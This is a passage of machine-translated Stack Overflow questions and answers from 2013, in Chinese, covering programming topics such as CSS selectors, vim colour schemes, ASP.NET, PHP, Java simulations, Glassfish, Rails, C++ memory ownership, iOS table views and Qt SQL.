我在想几个解决方案。一：使用Javascript。这听起来对我来说不太有吸引力，因为我希望在没有 JS 的情况下让我的页面完全正常运行，以防有人浏览我的页面时在他们的浏览器中禁用了 JS。我也希望保持简单。第二种解决方案：将`foo`div放在 div 内`bar`，然后使用`position: absolute`移动`foo`到我希望它结束​​的位置。这是一个混乱的解决方案，原因应该很明显。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:14:07.397

是的，但不是 CSS。使用 JavaScript。这是一个 jQuery 示例。

```
$('#bar').hover(
  function(e) {
    $foo = $('#foo');
    $foo.data('prevColor', $foo.css('color'));
    $foo.css('color', 'green');
  },
  function(e) {
    $foo = $('#foo');
    $foo.css('color', $foo.data('prevColor'));
  }
); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T04:19:42.667

您可以将其放在容器内，然后将其绝对定位在容器的 DOM 流之外以产生相同的效果。这并不完全理想，但有可能：

```
<div id="content">
    <p id="blah">blah blah blah</p>
</div>

<div id="navigation-panel">
    Hover over a button!
    <div class="buttons">
        <div id="button1">button1</div>
        <div id="button2">button2</div>   
        <div class="foo" id="bar">bar<p id="foo">blah blah blah</p></div>
    </div>
</div>

#content {
    height:80px;
}

#foo {
    position:absolute;
    top:40px;
}

#bar:hover #foo {
    color: green;
} 
```

[http://jsfiddle.net/Uyypc/](http://jsfiddle.net/Uyypc/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T04:20:57.133

## “父”选择器

目前没有办法在 CSS 中选择元素的父级。

如果有办法做到这一点，它将在 CSS 选择器规范中，CSS 2 或 3

[CSS 3 选择器规范](http://www.w3.org/TR/css3-selectors/#selectors)& [CSS 2 选择器规范](http://www.w3.org/TR/CSS2/selector.html#pattern-matching)

同时，如果您需要选择父元素，则必须使用 JavaScript。

* * *

[CSS Selectors 4 Spec](http://www.w3.org/TR/selectors4/#subject)提供了一种语法来定义选择器的“主题”，使用 ! 符号。截至 2012 年，这在任何浏览器中均不可用。

使用 CSS4 选择器，原始问题可以这样解决：

```
li! > a.active { /* styles to apply to the li tag */ } 
```

* * *

MooTools 已经支持 CSS 4 级选择器几年了——讽刺的是，MooTools 中的 Slick 选择器引擎实际上能够在规范草案发布之前处理这些选择器 -->[如何为选择器指定不同的主题?](https://github.com/mootools/slick/wiki/How-do-I-specify-a-different-subject-for-the-selector?)

# vim - iTerm2 中 ssh 用户的曝光配色方案和调色板失真

> ID：15262865
> 
> 赞同：1
> 
> 时间：2013-03-07T04:05:16.813
> 
> 标签：vim, color-scheme, tmux, iterm, ansi-term

我的设置包括 vim、iTerm2、tmux 和日晒深色方案。我将深色的日晒调色板加载到 iTerm2 中（修改 ansi 颜色），并且不使用`let g:solarized_termcolors=256`自述文件中谈到的退化的日晒配色方案（即，）作为使用调色板的替代方案。一切看起来都很棒。

但是，我经常与同事远程配对。人们从 iTerm2 的其他实例（有时是 Terminal.app）通过 ssh 进入我的机器，并以我的 tmux 会话作为他们的基础/父会话创建一个新的 tmux 会话。在 iTerm2 的情况下，他们的设置不包括加载日晒调色板（一个完全使用另一个调色板）和设置`let g:solarized_termcolors=256`使用退化的日晒配色方案。如果这就是他们想要的，那就太好了，但是当他们通过 ssh/tmux 连接到我时，颜色会丢失，并且经常会失真到难以辨认的程度。

除了让每个人都使用相同的设置之外，是否有任何设置组合来解决这个问题？现在建议我使用降级的配色方案，而不是加载日晒调色板，这样 ansi 颜色就不会被修改。这确实有效，但给我留下了退化的日晒配色方案。因为我更喜欢非退化的日晒配色方案，所以我不想采用这种方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T07:18:54.943

在终端中使用时，Vim 的日光化色彩方案默认为 16 种颜色，并且取决于终端模拟器的调色板，因为它使用“红色”、“黄色”……作为`ctermfg`和朋友的值。

如果您希望到处都使用相同的颜色，那么您显然需要到处使用相同的调色板，因为您的“红色”可能不是其他人的“红色”。

我不知道作者在写它时抽了什么，但与默认值相比，*根本*`let g:solarized_termcolors=256`没有“降级” 。默认仅使用 16 种颜色的调色板（取决于终端的调色板，正如我们已经看到的），而此选项使其使用与终端无关的 256 色调色板。因为颜色方案不再依赖于终端仿真器的调色板，所以颜色实际上“保证”在您的终端仿真器和其他人的终端仿真器上看起来“好”和“相同”。

 *问题是您的终端仿真器及其终端仿真器必须支持 256 色。今天的所有终端都可以，但默认值通常设置为 16 色。不过，通常很容易将 256 色支持“打开”。

但是这个选项是 Vim-only。您的提示或某些命令的输出或`tmux`TUI的颜色*可能*仍然让您的同事感到“不正常”。

自定义设置的能力当然是 Vim 体验的一个重要方面。但定制是有代价的。你已经习惯了许多小事情，并且可能会发生这种情况，面对一个截然不同的设置，嗯……你只是迷路了。或者，正如您所遇到的那样，您的设置被定制到您的同事无法使用的地步。

只有当您和您的配对能够在设置上达成妥协时，配对编程才能*工作。*显然，这个设置可能不完全是*你*或*他的*，但你*必须*找到一个每个人都同意配对工作的中间立场。因为您和您的搭档可能使用不同版本的 tmux/vim、不同的 shell 或不同的终端仿真器，所以最安全的选择是尽可能使用最基本的设置。对你来说不幸的是，solarized 太脆弱了，远远不够“基本”。*

# objective-c - 在 ObjC 中从秒中获取 NSDate

> ID：15262867
> 
> 赞同：-2
> 
> 时间：2013-03-07T04:05:22.310
> 
> 标签：objective-c, nsdate, nsdateformatter

我的秒数是 54000。我怎样才能得到下午 3:00:00 的时间？

我可以使用任何日期格式化程序来获取它吗？

谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-07T04:11:36.550

假设给定的秒数在本地时区，并且您想要转换为本地时区。

```
NSInteger timeInSeconds = 54000;

NSDate *date = [NSDate dateWithTimeIntervalSinceReferenceDate:timeInSeconds]];

NSDateFormatter *formatter = [[NSDateFormatter alloc]init];
[formatter setDateFormat:@"hh:mm:ss a"];

NSString *dateString = [formatter stringFromDate:date]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:12:11.747

假设您希望在“正常”日期（即没有时区更改的日期）根据当前区域设置格式化时间，

```
double seconds = 54000;

NSDateFormatter * fmt = [NSDateFormatter new];
[dateFormatter setDateStyle:NSDateFormatterNoStyle];
[dateFormatter setTimeStyle:NSDateFormatterLongStyle];
[dateFormatter setTimeZone:[NSTimeZone timeZoneForSecondsFromGMT:0]];

NSDate *date = [NSDate dateWithTimeIntervalSinceReferenceDate:seconds];
NSString * s = [fmt stringFromDate:date];

// If you are not using ARC,
[fmt release]; 
```

# asp.net - 无法在数据列表中获取文本框值

> ID：15262872
> 
> 赞同：1
> 
> 时间：2013-03-07T04:05:44.840
> 
> 标签：asp.net, ajax, datalist

我试图在数据列表中获取文本框“数量”的值。这没用。怎么了？我在 ajax 更新面板中有 CartItem 标签和日期列表。谢谢你的帮助。这是我的代码：

```
<asp:Label ID="CartItems" runat="server" Text="CartItem"></asp:Label>
<br />
<asp:DataList ID="DataList1" runat="server" CellPadding="10" 
 DataKeyField="product_id" DataSourceID="SqlDataSource1" RepeatColumns="2">
 <ItemTemplate>
    <asp:Label ID="product_id" runat="server" 
         Text='<%# Eval("product_id") %>' /><br/>
    <asp:Label ID="product_name" runat="server" 
         Text='<%# Eval("product_name") %>' />
  <br />
  Qty
  <br/>

    <asp:TextBox ID="Qty" runat="server"></asp:TextBox>
    <asp:Button ID="ButtonAddToCart" runat="server" Text="Add to Cart" 
         onClick="ButtonAddToCart_Click"/>                    

    <br />
  </ItemTemplate>
</asp:DataList> 
```

这是按钮单击事件。CartItem 具有空值：

```
 protected void ButtonAddToCart_Click(object sender, EventArgs e)

    {
        CartItem.Text = DataList1.FindControl("Qty").ToString();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:12:37.420

```
 TextBox Qty = (TextBox)DataList1.FindControl("Qty");
if(Qty != null)
{
    CartItem.Text =Qty.Text;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:26:07.723

您可以使用[NamingContainer](http://msdn.microsoft.com/en-us/library/system.web.ui.control.namingcontainer.aspx)或`Parent`访问同级控件

```
protected void ButtonAddToCart_Click(object sender, EventArgs e)
{
    var button = sender as Button;
    var textbox = button.NamingContainer.FindControl("Qty") as TextBox;
    CartItem.Text = textbox.Text;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-19T20:31:30.240

试试这个

```
TextBox txtquantity = (TextBox)(e.Item.FindControl("Qty")); 
```

只需使用这个......你会得到价值`txtquantity`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T04:37:32.963

我更喜欢你使用 datalist 的 item_command 事件做一些这样的想法。

```
 <asp:Label ID="CartItems" runat="server" Text="CartItem"></asp:Label>
  <br />
<asp:DataList ID="DataList1" runat="server" CellPadding="10" DataKeyField="product_id" DataSourceID="SqlDataSource1" RepeatColumns="2">
 <ItemTemplate>
  <asp:Label ID="product_id" runat="server" 
     Text='<%# Eval("product_id") %>' /><br/>
<asp:Label ID="product_name" runat="server" 
     Text='<%# Eval("product_name") %>' />
 <br />
 Qty
<br/>

<asp:TextBox ID="Qty" runat="server"></asp:TextBox>
<asp:Button ID="ButtonAddToCart" runat="server" Text="Add to Cart" CommandName="addtocart2"   OnCommand="DataList1_ItemCommand"
    />                    

<br />
</ItemTemplate>
</asp:DataList> 
```

这是有效的 item_command 事件。

```
 public void DataList1_ItemCommand(object source, System.Web.UI.WebControls.CommandEventArgs e){
 TextBox qtytxtbox =  DataList1.FindControl("Qty") as TextBox;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-07T05:01:21.910

你可以这样做

```
protected void ButtonAddToCart_Click(object sender, EventArgs e)
{

    Button ButtonAddToCart= (Button)sender;
    DataListItem item = (DataListItem)ButtonAddToCart.NamingContainer;
    var textbox = (TextBox)item.FindControl("Qty");
} 
```

# php - 谁能帮我用更好的方法替换这个代码片段而不使用 if elseif

> ID：15262873
> 
> 赞同：0
> 
> 时间：2013-03-07T04:05:47.763
> 
> 标签：php

在此代码片段中，所有值都将由数据库驱动，我需要更好地替换此代码。

佣金百分比将根据任务价格范围计算。

```
$commission1=10;//in percentage
     $commission2=20;
     $commission3=30;
     $taskprice =200;
     if($taskprice >=0 && $taskprice <=150)
       {
    $adminearnings = ($taskprice *$commission1 ) / 100 ;
    $Geniepayment = $taskprice - $adminearnings;
       }
    else if($taskprice >=151 && $taskprice <=300)
      {
     $adminearnings = ($taskprice * $commission2) / 100 ;
     $Geniepayment = $taskprice - $adminearnings;
      }
   else if($taskprice >=301 && $taskprice <=450)
     {
    $adminearnings = ($taskprice * $commission3 ) / 100 ;
    $Geniepayment = $taskprice - $adminearnings;
     }
 echo $taskprice.'</br>';
 echo $adminearnings.'</br>';
 echo $Geniepayment.'</br>'; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:21:51.400

至于我，我会做一个简单的功能来快速访问你需要的东西：

```
function calculate($commission, $taskprice)
{
    $arrayCommission = array(0, 10, 20, 30);
    $adminearnings = ($taskprice * $arrayCommission[$commission] ) / 100 ;
    $Geniepayment = $taskprice - $adminearnings;
    return array($taskprice, $adminearnings, $Geniepayment);
} 
```

那将是这样的：

```
if($taskprice >=0 && $taskprice <=150)
{
   $arrayAnswer = calculate(1, $taskprice);
}
elseif($taskprice >=151 && $taskprice <=300)
{
   $arrayAnswer = calculate(2, $taskprice);
}
elseif($taskprice >=301 && $taskprice <=450)
{
   $arrayAnswer = calculate(3, $taskprice);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:36:28.417

我同意其他人的观点，即条件是必需的。我会重构以提取计算，如下所示：

```
<?php

// Returns array(earnings, payment)
//
function getEarningsPayment($taskprice, $commission)
{
    $earnings = ($taskprice * $commission) / 100 ;
    $payment = $taskprice - $adminearnings;
    return array ($earnings, $payment);
}

$commission1=10;//in percentage
$commission2=20;
$commission3=30;
$taskprice =200;

if($taskprice >=0 && $taskprice <=150)
    $commission = $commission1;
else if($taskprice >=151 && $taskprice <=300)
    $commission = $commission2;
else if($taskprice >=301 && $taskprice <=450)
    $commission = $commission3;

list ($adminearnings, $Geniepayment) = getEarningsPayment($taskprice, $commission);

echo $taskprice.'</br>';
echo $adminearnings.'</br>';
echo $Geniepayment.'</br>';

?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-08T08:40:45.590

伙计们，这个想法怎么样..等待您的反馈和建议

```
$commissions = array
  (
  '0'=>array
  (
  "commission_start_range"=>"0","commission_end_range"=>"100","commission_amount"=>"10"
  ),
  '1'=>array
  (
  "commission_start_range"=>"101","commission_end_range"=>"200","commission_amount"=>"20"
  ),
  '2'=>array
  (
  "commission_start_range"=>"201","commission_end_range"=>"300","commission_amount"=>"30"
  )
  );

function check_commission($task_price,$commissions)
    {
    foreach($commissions as $commission_data)
    {
    $start = $commission_data['commission_start_range'];
    $end   = $commission_data['commission_end_range'];
    $amount= $commission_data['commission_amount'];
    if($task_price >=$start && $task_price <=$end)
    {
    $admin_earnings = ($task_price * $amount) / 100 ;
    $genie_payment = $task_price - $admin_earnings;
    return  $admin_earnings;//echo $admin_earnings;
    }
    }
    }
    check_commission(200,$commissions); 
```

# java - 在这种情况下，有哪些方法可以存储和恢复数字？

> ID：15262874
> 
> 赞同：0
> 
> 时间：2013-03-07T04:05:47.840
> 
> 标签：java, arrays, list, simulator

所以我将运行一个玩掷骰子的模拟器。

我的任务要求我运行 sim 10,000,000 次。

这些都不是问题。我制作了 sim，我知道如何运行，我知道如何创建所需的变量。

我不确定的是，我应该如何存储每场比赛的结果？

我最终需要找到的是：

平均每场游戏的掷骰数 最大游戏中的掷骰数 需要超过 30 次掷骰的游戏数 获胜次数 失败次数 获胜概率 最长的获胜序列和最长的失败序列

一切都很简单，我只是不确定如何存储 10,000,000 个数字然后轻松访问它们。

例如第一个：平均卷数我应该创建一个包含 10,000,000 个项目的数组列表吗？在每场比赛结束时添加一项，然后将它们全部相加并除以 10,000,000？

我意识到这应该可行，我只是想知道是否有另一种方法，或者可能是更好（更有效）的方法。

这个问题的新部分：我可以从一个方法返回多个值吗？目前，模拟运行了 10,000,000 次，每次都会返回输赢。但我还需要它来返回每场比赛的掷骰数......否则我无法计算出平均掷骰数和最高掷骰数以及超过 30 次掷骰的游戏数。

这里有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:14:30.767

您可以随时计算统计数据而不存储它们。例如，如果您的班级中有一个“平均”字段，那么在每次模拟之后`average = ((number of rolls this game) + (total rolls so far)) / (number of games so far)`。其他统计数据也可以这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T05:04:51.800

您不需要为所需的任何统计信息维护数组。

对于*每场比赛的平均掷骰数*，只需保留一个变量，例如`cumulativeNumberOfRolls`；每场比赛结束后，只需输出该场比赛的掷骰数并将其添加到此变量中。完成所有模拟后，只需将该值除以模拟总数（10,000,000）即可。

对于*最大。卷数*，再次保持一个变量，比如说`maxRolls`；每场比赛结束后，输出该场比赛的掷骰数并将其与此变量进行比较。如果此游戏中的掷骰数较大，则只需`maxRolls`使用新值进行更新。尝试相同的方法 - 使用单个变量并在每场比赛后更新它 - 以获得*需要超过 30 次滚动*、*获胜*次数和*失败*次数的游戏的值。如果您遇到问题，我们可以在评论中讨论。

对于*最长的胜利和失败序列*，您需要维护一堆变量：

*   总体上最长的获胜序列
*   总体上最长的损失序列
*   当前序列计数
*   当前序列类型（指示当前序列是获胜序列还是失败序列）

这是该方法的概述。每场比赛结束后，将比赛结果与`current sequence type`. 如果它们相同，例如当前游戏的结果是胜利并且当前序列类型也是胜利，那么只需更新`current sequence count`并继续下一场比赛。如果它们不同，则需要考虑两种情况，并为它们做些稍微不同的事情。我会解释一个 - 当前游戏的结果是输，`current sequence type`是赢。在这种情况下，与 比较`current sequence count`，`longest win sequence overall`如果 ( `current sequence count`) 更大，则只需更新`longest win sequence overall`. 在此之后，将 更改`current sequence type`为 loss 并将 设置`current sequence count`为 1。

将上述方法扩展到第二种情况——当前游戏的结果是赢，`current sequence type`而是输。如果您有任何澄清，请随时在评论中回复。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:11:46.513

好吧，您的运行次数是固定的，因此您不妨使用数组而不是数组列表（更快）。在我看来，您实际上只需要两个数组：一个列出每场比赛的结果（可能是输赢的真/假），另一个列出该场比赛的掷骰数。您在运行模拟时填写这些信息；然后你可以做一堆简单的数学运算，涉及一个数组或另一个数组来获得你的统计数据。对我来说，这似乎是最好的方法；我认为如果不付出很多过度的努力，你不会变得更有效率。

# jakarta-ee - 单个服务器上的多个 Glassfish 实例

> ID：15262875
> 
> 赞同：3
> 
> 时间：2013-03-07T04:05:48.263
> 
> 标签：jakarta-ee, glassfish

我正在运行 glassfish3122。我试图在一个盒子上运行两个单独的 glassfish 实例。一种用于开发，一种用于测试。重新配置端口后，我遇到了最后一个问题：

```
java.net.BindException: No free port within range: 7676=com.sun.enterprise.v3.se
rvices.impl.ServiceInitializerHandler@69ed60dd 
```

我知道这是 JMS。如何将其配置为在 7676 以外的端口上运行？我在 glassfish3122eclipsedefaultdomain/config/domain.xml 中看不到它。

我应该改为拥有一个具有多个域的 glassfish 实例吗？

谢谢，斯科特

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T13:57:11.157

我从来不赞成直接编辑 domain.xml。你永远不知道什么会搞砸。相反，我使用*asadmin get*或*asadmin set*。

要列出所有属性，请输入：
**$ asadmin get \* # 在 Unix/LInux/Mac 系统上转义星号**

要查找感兴趣的属性，我使用 grep：
**$ asadmin get \* | grep 7676
configs.config.server-config.system-property.JMS_PROVIDER_PORT.value=7676**

现在，将属性设置为另一个值：
**$ asadmin set configs.config.server-config.system-property.JMS_PROVIDER_PORT.value=9999**

# ruby-on-rails - 将现有 SQL Server 数据库与 Ruby on Rails 结合使用

> ID：15262877
> 
> 赞同：3
> 
> 时间：2013-03-07T04:06:02.940
> 
> 标签：ruby-on-rails, ruby, sql-server, ruby-on-rails-3

我正处于学习 Ruby 的早期阶段。我真的不知道如何使用现有的数据库，其中包含 ruby​​ 上的表和数据。我在互联网上拥有或找到的每一篇指南、每一篇文章总是使用迁移功能创建一个新的。

但是，在 RoR 上的 SQL Server 中使用现有数据库的步骤是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T07:16:43.343

你很幸运，朋友。我的第一个 Rails 项目（7 年前）是针对一个糟糕的 SQL Server 数据库。

根据上述，您需要适当地设置您的 database.yml。但是对于现有的数据库，表名和列名显然不太可能符合 Rails 约定。好消息是您可以覆盖所有这些默认值。以下是这些指令的非详尽列表：

在源自 AR::Base 的模型中，

set_table_name 'actual_table_name'
set_primary_key 'actual_primary_key_name'

在各种关联指令（has_one、has_many、belongs_to）上，有 :foreign_key 键可让您指定外键的名称。

现在，MS SQL Server 允许您做的一件可怕的事情是您可以在列名中嵌入空格。不要害怕，您仍然可以使用 write_attribute("badly named column") 和 read_attribute("badly named column") 按名称引用这些列。您也可以在各种指令中引用它们，如下所示：

validates_length_of "传真号码", :maximum => 17, :allow_nil => true

最后，您可以参考这些名称异常的列生成的隐含方法，如下所示：

self.send('传真号码=', new_fax_number)

显然，您不能将它们称为符号，因为 Ruby 符号中不允许使用空格。

祝你好运，下次我希望你能使用真正的 RDBMS，比如 Informix :)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:20:21.330

首先，您必须将应用程序设置为用户 sql server 以进行数据库连接。您必须在**gemfile**中使用 gem for **sql server**并且必须相应地设置**database.yml**文件。

 ****在**database.yml**中，在**config**文件夹中将相同数据库的名称放在该文件的 Development 部分中。

```
 development:
  adapter: 
  database: db_name_dev
  username: 
  password:
  host: localhost
  socket: 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T07:22:43.490

使用现有服务器。在您的`database.yml`文件中，您必须指定主机、端口和数据库名称。

```
`database: <host>:<port>/<database_name>` 
```

例如

```
development:
  adapter: mysql2
  database: your.mysqlserver.com:1521/project_database
  username: project_user
  password: project_password 
```****

# jboss - 在 Jboss eap 5.1 中增加内存

> ID：15262881
> 
> 赞同：0
> 
> 时间：2013-03-07T04:06:16.160
> 
> 标签：jboss, jvm-arguments

我正在使用**Jboss-eap-5.1**。当我试图通过**run.conf.bat****更改内存**参数时，它**没有改变**。当我通过**Java Visual VM**看到更改后运行服务器时，未应用更改。如何更改 Jboss-eap-5.1 中的内存大小

 ******> 这向您展示了我如何进行更改 (JAVA_OPTS="-Xms128m -Xmx512m )

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:42:32.490

解决了。在通过 run.bat 命令运行服务器之前需要运行 run.conf.bat 文件。然后系统会初始化run.conf.bat文件中的参数******

# c++ - 指针和抽象类

> ID：15262885
> 
> 赞同：2
> 
> 时间：2013-03-07T04:07:33.467
> 
> 标签：c++, c, pointers, abstract-class

```
struct Abstract{
    virtual void methodA() = 0;
};

struct Test : public Abstract{
    virtual void methodA(){
        printf("Test message");
    }
};

class Foo{
    Abstract* abs; //I made it this way so that an instance of Foo 
                   //can easily switch between any class that implements 
                   //Abstract
public:
    virtual ~Foo(){
        delete abs; //free abs
    }

    void setAbs(Abstract* a){
        abs = a; //is there any other way to do this?
    }

    void changeAbs()//method to switch abs

    void show(){
        abs->methodA();
    }
};

int main(){
    Test *test = new Test();
//    Test test; //local instantiation will throw a segmentation fault
               //because abs is freed in the desctructor of Foo
    Foo foo;
    foo.setAbs(test);
    foo.show();

//    delete test; //using a pointer is fine unless freed
    return 0;
} 
```

我的担忧是：

1.  如果我**没有**在析构函数中释放 abs 并且用户忘记释放他的实现 Abstract 的对象，或者如果用户这样做`setAbs(new Test())`，就会有泄漏。

2.  *如果我在析构函数中释放 abs ，如果用户在本地实例化Test*或者他使用指针并最终自己删除它，它将引发分段错误。

3.  `Abstract abs`也不允许，因为它是一个抽象类

我想将 setAbs() 更改为如下内容：

```
void setAbs(Abstract* a){
    abs = new Abstract(*a); //but copying like a normal class doesn't work on abstract classes
} 
```

我的问题是，有没有其他方法可以实现 setAbs() 以便复制传递的参数？

如果没有其他办法，我会让释放成为用户的工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T04:10:51.253

这里的根本问题是你没有明确谁拥有这个内存。

如果你的类拥有它，那么在你的析构函数中释放是安全的。好吧，不是你写的方式，而是理论上。阅读[三法则](http://en.wikipedia.org/wiki/Rule_of_three_%28C++_programming%29)。

如果您的类不*拥有*该指针，那么请不要释放它。解除分配不是你的，所以使用它，不要再做。

处理记忆的安全方法是隐含地执行关于谁负责什么的合同。如果用户继续使用`delete`您的指针，那么，告诉他们停止；这不关他们的事。你可以使用`std::unique_ptr`指针和`get()`函数来做同样的事情。上课不会阻止你，怎么可能？它不在乎你是否从自己的脚上开枪。实时调频。

Speaking of `std::unique_ptr`... why aren't you using it (or `std::shared_ptr` if appropriate)? This is a solved problem, no need to come up with your own solution here.

# iphone - UITableView reloadData 崩溃

> ID：15262888
> 
> 赞同：3
> 
> 时间：2013-03-07T04:07:45.057
> 
> 标签：iphone, ios, objective-c, cocoa-touch, uitableview

我将 CustomImageView 添加到 UITableViewCell。

```
 UITableViewCell *cell = nil;
    if (cell == nil) {
         cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault  reuseIdentifier:@"Cell1"] autorelease];
    }
    CustomImageView *customIV = [[CustomImageView alloc] init];
    [cell.contentView addSubView:customIV];
    [customIV release]; 
```

但是当我尝试重新加载 tableview 时，会发生错误。

错误调用堆栈如下。

![在此处输入图像描述](../Images/f8a40f859835280066208829f8989a17.png)

输出字符串如下。

> -[CustomImageView superview]：消息发送到释放的实例 0x1f848f30

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:14:18.430

```
CustomImageView *customIV = [[CustomImageView alloc] initWithFrame:CGRectMake(x, y, w, h)];
[cell.contentView addSubView:customIV]; 
```

当我释放内存时，它就完成了。
所以根据我的说法，不需要释放，因为它会释放内存。

希望它会帮助你。
谢谢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:40:59.697

尝试**评论**此行`[customIV release];`并运行，它不应该在重新加载数据时崩溃。

这背后的原因是每次它尝试创建新的自定义视图并发布它时，都会导致系统额外负载并发生崩溃。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T07:29:34.657

您只想将图像添加到每个单元格一次。将您的代码更改为：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"Cell1"];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault  reuseIdentifier:@"Cell1"] autorelease];
        CustomImageView *customIV = [[CustomImageView alloc] init];
        [cell.contentView addSubView:customIV];
        [customIV release];
    }

    return cell;
} 
```

如果这不起作用，那么您需要展示您的完整`cellForRowAtIndexPath`方法。通过仅显示部分代码，您很难提供帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T04:33:07.093

发生此错误是因为每次`CustomImageView`创建对象时都`cell`创建了对象。

所以，最好的方法是首先初始化对象`CustomImageView`然后创建你的`UITableView`

诸如此类，

`CustomImageView *customIV`把它放在你的`.h file`然后`@synthesize`它在`.m File`

（把这段代码放在上面`UITableView`）

```
self.customIV = [[CustomImageView alloc] init]; 
```

然后创建`UITableView`

```
self.tablView = [[UITableView alloc]init];
.
.
.
. 
```

并且`cellForRowAtIndexPath` 只添加`[cell.contentView addSubView:self.customIV];`

# c# - 如何延迟 C# 从图片框中复制图像

> ID：15262890
> 
> 赞同：1
> 
> 时间：2013-03-07T04:07:49.637
> 
> 标签：c#, delay, picturebox

我有 2 个 picutrebox，我正在将加载的图像复制到另一个，但是我的代码复制速度太慢，当我删除`Refresh();`它时，它会立即出现，我想让延迟比刷新时更快

这是代码

```
 private void buttonClone_Click(object sender, EventArgs e)
    {

        if (pictureBoxSourcePicture.Image == null)
        {
            MessageBox.Show("No pictuer loaded");
            return;
        }
        Bitmap clonePic = new Bitmap(pictureBoxSourcePicture.Image.Width, pictureBoxSourcePicture.Image.Height);
        Bitmap sourcePic = new Bitmap(pictureBoxSourcePicture.Image);

        for (int x = 0; x < pictureBoxSourcePicture.Image.Width; x++)
        {
            for (int y = 0; y < pictureBoxSourcePicture.Image.Height; y++)
          {

              clonePic.SetPixel(x, y, sourcePic.GetPixel(x, y));
              pictureBoxTarget.Image = clonePic;
              pictureBoxTarget.Refresh();
              //pictureBoxSourcePicture.Image.Clone();
          }
        }
    } 
```

# qt - QSqlRecord 未将 0 插入数据库

> ID：15262893
> 
> 赞同：3
> 
> 时间：2013-03-07T04:08:27.253
> 
> 标签：qt

我遇到了 QSqlRecord 的一个奇怪问题，它插入 null 而不是 '0'。这是说明问题的示例代码：

```
#include <QCoreApplication>
#include <QtSql>

int main(int argc, char *argv[])
{
QCoreApplication a(argc, argv);

// Filename for sqlite database
QString filename = "./test.db";

// Make sure the database doesn't already exisit
if (QFile::exists(filename)){
    QFile::remove(filename);
}

// Connect to the database
QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE");
db.setDatabaseName(filename);

db.open();

// Create test table
QSqlQuery query(db);

bool result;
result = query.exec("CREATE TABLE IF NOT EXISTS 'test' ('key' TEXT, 'value' INTEGER)");
db.commit();
// Insert the test value into the database
QSqlTableModel model(0, db);

// Set the table
model.setTable("test");

// Set up the data
QSqlRecord record = model.record();
record.setValue("key", "first");
record.setValue("value", 1);
result = model.insertRecord(-1, record);
model.submitAll();

record.setValue("key", "second");
record.setValue("value", 0);
result = model.insertRecord(-1, record);
model.submitAll();

record.setValue("key", "third");
record.setValue("value", 2);
result = model.insertRecord(-1, record);
model.submitAll();
// Commit changes and close database]
db.commit();
db.close();
} 
```

如果我查询`test.db`我得到：

```
sqlite> select * from test;
first|1
second|
third|2 
```

请注意，第二个条目没有值。

我在 Windows 7 上使用 Qt 5.0.1 和 Mingw 4.7。

# firebase - 我如何知道我的逆火收藏何时完成从服务器加载？

> ID：15262895
> 
> 赞同：4
> 
> 时间：2013-03-07T04:08:38.670
> 
> 标签：firebase, backfire

我正在玩firebase和适得其反。该[示例](https://github.com/firebase/backfire)没有明确说明，但我发现当您实例化`Backbone.Firebase.Collection`. 例如：

```
var TodoList = Backbone.Collection.extend({
  model: Todo,
  firebase: new Backbone.Firebase("https://<your-namespace>.firebaseio.com")
});
var todos = new TodoList(); // fetches data 
```

我怎么知道检索何时完成？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-07T16:04:50.957

在使用 Backfire 的模型进行了相当广泛的工作后，我对此有几个想法。我希望他们中的一些人能为您的项目提供好的想法。

**将心智模型更改为实时环境**

首先，摆脱知道“所有数据已加载”的心态，假设这会像我早期一样困扰您。我们现在处于实时环境中。只需从零开始，将每条传入的记录都视为更新。这节省了大量尝试处理状态的时间和精力。

**延迟渲染和 DOM 绑定**

现在有了 Backbone，我经常发现自己想做一个惰性渲染。也就是说，我想在逻辑上处理以下情况：

*   立即开始收集数据，但在调用 render 之前不要显示它
*   显示“正在加载”消息，直到出现一些数据
*   当多条记录靠近时，不要为每条记录重新渲染

频繁更改数据的一个很好的解决方案是 Backbone.ModelBinder 的[CollectionBinder 工具](https://github.com/theironcook/Backbone.ModelBinder/wiki/A-new-Class-to-Bind-Backbone-Collections-to-Views:-Javascript-Weekly-May-18th)，它单独操作 DOM 的每个节点，而不是重新渲染所有记录。他们的网站上有很多例子，所以我不会在这里详细介绍。

**Debounce 作为一种快速而肮脏的解决方案**

